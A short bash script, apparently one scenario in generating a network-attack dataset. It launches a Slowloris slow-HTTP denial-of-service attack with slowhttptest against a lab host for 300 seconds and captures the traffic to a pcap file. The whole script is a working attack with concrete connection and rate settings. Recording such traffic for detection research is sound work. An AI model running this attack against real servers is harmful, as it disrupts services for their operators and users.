#!/bin/bash
VICTIM="10.0.2.10"
DURATION=300

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Da sua -i s2-eth99 thanh -i any
tcpdump -i any -w datasets/s07_slowloris.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$VICTIM/ -p 3 -l $DURATION &
SLOW_PID=$!

sleep $DURATION
kill $TCPDUMP_PID $SLOW_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat kich ban Slowloris!"